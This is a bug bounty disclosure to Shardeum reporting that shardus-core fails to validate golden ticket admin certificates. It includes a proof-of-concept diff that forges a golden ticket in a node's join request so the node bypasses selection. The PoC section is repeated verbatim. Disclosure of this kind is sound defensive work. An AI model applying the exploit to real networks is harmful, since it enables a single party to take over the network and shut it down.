# 33696 - \[BC - Critical] Failure to validate golden ticket admin cert

## Failure to validate golden ticket admin cert

Submitted on Jul 26th 2024 at 22:15:30 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33696

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* Taking over majority of the network by single authority
* Modification of transaction fees outside of design parameters

### Description

## Description

Failure to validate golden ticket admin cert leading to malicious node be able mark themselves golden to get into network bypassing selection algorithm altogether.

## Proof of Concept

* Launch a legit shardeum network and enable all logs, that way you can verify the malicious node get into the network by golden ticket by checking legit node's logs. (Logs are not necessary for attack to work it's only for your own benefit to verify the attack work)
* Apply the patch to shardus/core. This will be malicious node.

```
diff --git a/src/p2p/Join/index.ts b/src/p2p/Join/index.ts
index 17d1d18d..ff60e099 100644
--- a/src/p2p/Join/index.ts
+++ b/src/p2p/Join/index.ts
@@ -785,6 +785,9 @@ export async function createJoinRequest(
       return
     }
   }
+
+  joinReq['appJoinData'].adminCert = {};
+  joinReq['appJoinData'].adminCert.goldenTicket = true;
   const signedJoinReq = crypto.sign(joinReq)
   if (logFlags.p2pNonFatal) info(`Join request created... Join request: ${Utils.safeStringify(signedJoinReq)}`)
   return signedJoinReq
@@ -1575,4 +1578,4 @@ export function nodeListFromStates(states: P2P.P2PTypes.NodeStatus[]): P2P.NodeL
   export function error(...msg: string[]): void {
     const entry = `Join: ${msg.join(' ')}`
     p2pLogger.error(entry)
-  }
\ No newline at end of file
+  }
```

* this patch make the malicious node mark itself as golden ticket node
* build and link it to your malicious shardeum node
* launch your malicious node
* it'll bypass the selection algorithm and will get in to the network at the next cycle
* If you enable logs in earlier step you can verify this by going into the logs of the legit nodes.
* Please use appropriate log settings to confirm if you need more info.

### Impact

This vulnerability allows malicious agent to launch army of node and effectively take over the network. >51%.

### The reason why it happen

* In shardus/core node were not properly validating the golden ticket admin cert. It was just checking if it's present or not. It should have checked if it's valid or not. [see the code](https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/p2p/Join/v2/select.ts#L103-L111)

## Proof of Concept

* Launch a legit shardeum network and enable all logs, that way you can verify the malicious node get into the network by golden ticket by checking legit node's logs. (Logs are not necessary for attack to work it's only for your own benefit to verify the attack work)
* Apply the patch to shardus/core. This will be malicious node.

```
diff --git a/src/p2p/Join/index.ts b/src/p2p/Join/index.ts
index 17d1d18d..ff60e099 100644
--- a/src/p2p/Join/index.ts
+++ b/src/p2p/Join/index.ts
@@ -785,6 +785,9 @@ export async function createJoinRequest(
       return
     }
   }
+
+  joinReq['appJoinData'].adminCert = {};
+  joinReq['appJoinData'].adminCert.goldenTicket = true;
   const signedJoinReq = crypto.sign(joinReq)
   if (logFlags.p2pNonFatal) info(`Join request created... Join request: ${Utils.safeStringify(signedJoinReq)}`)
   return signedJoinReq
@@ -1575,4 +1578,4 @@ export function nodeListFromStates(states: P2P.P2PTypes.NodeStatus[]): P2P.NodeL
   export function error(...msg: string[]): void {
     const entry = `Join: ${msg.join(' ')}`
     p2pLogger.error(entry)
-  }
\ No newline at end of file
+  }
```

* this patch make the malicious node mark itself as golden ticket node
* build and link it to your malicious shardeum node
* launch your malicious node
* it'll bypass the selection algorithm and will get in to the network at the next cycle
* If you enable logs in earlier step you can verify this by going into the logs of the legit nodes.
* Please use appropriate log settings to confirm if you need more info.
